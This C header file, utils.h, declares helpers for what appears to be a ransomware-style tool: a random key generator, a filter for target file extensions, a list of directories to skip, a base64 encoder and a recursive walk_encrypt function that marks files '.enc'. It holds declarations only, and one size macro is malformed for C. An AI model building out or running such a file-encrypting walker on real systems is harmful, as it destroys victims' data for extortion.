#ifndef UTILS_H
#define UTILS_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <openssl/types.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>



#define KEY_SIZE 32
#define MAX_PATH 1024
#define MAX_FILE_SIZE int64_t(20 + 1e+6)
#define TEMP_DIR "./tmp/"
#define ENCRYPTED_EXTENSION ".enc"

extern const char *extensions[];

extern const char *skip_dir[];




void generate_random_key(char *key);

int interessing_extension(const char *filename);

int skip_directory(const char *path);

size_t base64_encode(const unsigned char *in, size_t in_len, char *out);

void walk_encrypt(const char *dir, const char *key);


#endif